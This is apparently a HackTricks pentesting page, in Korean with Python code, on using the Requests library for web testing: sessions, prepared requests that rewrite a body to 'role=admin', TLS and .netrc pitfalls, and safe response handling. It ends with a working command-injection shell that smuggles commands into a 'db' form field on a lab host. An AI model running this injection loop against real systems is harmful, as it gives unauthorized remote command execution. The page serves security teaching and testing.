# Web Requests

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

이 예제에서는 Requests의 문서화된 request 인자, response 속성, multipart file tuple 및 session을 사용합니다.<sup>[[1]](#references)</sup> `verify=False` 예제는 TLS certificate verification을 비활성화하므로 통제된 testing 환경에서만 제한적으로 사용해야 합니다.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## 페이로드 제어를 위한 Prepared requests

`PreparedRequest`는 전송되기 전에 최종 URL, headers 및 인코딩된 body를 노출합니다. Session cookies 또는 authentication을 적용해야 하는 경우 `Request.prepare()` 대신 `Session.prepare_request()`를 사용하여 생성하세요. prepared-flow가 환경 proxy/CA 설정도 준수해야 하는 경우에는 `merge_environment_settings()`와 명시적으로 병합하세요.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
이는 exploit에 비표준 인코딩이 필요하거나, 구성된 payload를 `response.request`에 저장된 request와 비교할 때 유용합니다. 이는 raw-HTTP primitive가 아닙니다. Requests는 헤더를 대소문자를 구분하지 않는 매핑으로 저장하므로, 동일한 이름을 할당하면 이전 값이 대체됩니다. 잘못된 request line이나 [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md)에 필요한 서로 다른 중복 `Content-Length`/`Transfer-Encoding` 필드를 전송하려면 더 낮은 수준의 sender를 사용해야 합니다.<sup>[[1]](#references)</sup>

## Session isolation, implicit credentials and TLS state

Session은 기본적으로 환경 설정을 신뢰합니다. 명시적인 authentication이 제공되지 않으면 Requests는 `.netrc`에서 Basic credentials를 가져올 수 있으며, 환경 변수에서 proxy configuration과 CA bundle 경로를 가져올 수도 있습니다. attacker가 제어하는 URL을 가져오는 scripts에서는 이러한 암묵적 입력을 비활성화하고, 의도한 lab proxy/CA만 명시적으로 구성해야 합니다. 2.32.4 이전 releases에서는 악의적으로 조작된 URL이 주어졌을 때 잘못된 host에 대한 `.netrc` credentials를 선택할 수 있었으며, upgrade가 불가능한 경우 `Session.trust_env = False`가 문서화된 workaround입니다.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
`verify=False`를 사용하는 session은 검증된 TLS가 필요한 session과 분리하세요. Requests 2.32.0 이전에는 `verify=False`로 처음 열린 connection이 이후 동일 origin 요청에서 해당 요청이 `verify=True`를 지정했더라도 재사용될 수 있었습니다. 업그레이드하면 이 pool-state 문제가 해결되지만, isolation을 적용하면 exploit script를 audit하기도 더 쉬워집니다.<sup>[[5]](#references)</sup>

## 안정적인 exploit 루프

Requests에는 기본 timeout이 없습니다. `(connect, read)` timeout은 전체 wall-clock deadline이 아닙니다. read 구성 요소는 client가 수신된 bytes 사이에서 대기하는 시간을 제한합니다. target이 `Location`을 제어하는 경우 automatic redirect를 비활성화한 다음, 새 request를 전송하기 전에 각 hop을 검증하세요. redirect가 활성화되어 있다면 `response.history`를 확인하세요. 대용량 또는 hostile response의 경우 `stream=True`를 사용하고, 제한된 크기의 chunks로 순회하며, context manager를 사용해 response를 닫아 pooled connection이 release되도록 하세요.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## RCE를 exploit하는 Python cmd

Command loop는 Python의 `Cmd`를 subclass하며, `default` method는 인식되지 않는 command prefix를 처리하고, `cmdloop`는 input line을 dispatch하며, `re.DOTALL`은 extraction pattern이 여러 줄에 걸쳐 일치하도록 합니다.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Requests Developer Interface](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — 줄 단위 명령 인터프리터 지원](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — 정규 표현식 연산](https://docs.python.org/3/library/re.html)
- [4] [악의적인 URL을 통한 `.netrc` 자격 증명 leak에 취약한 Requests](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [`verify=False`로 첫 번째 요청을 수행한 후 요청을 검증하지 않는 Requests `Session` 객체](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
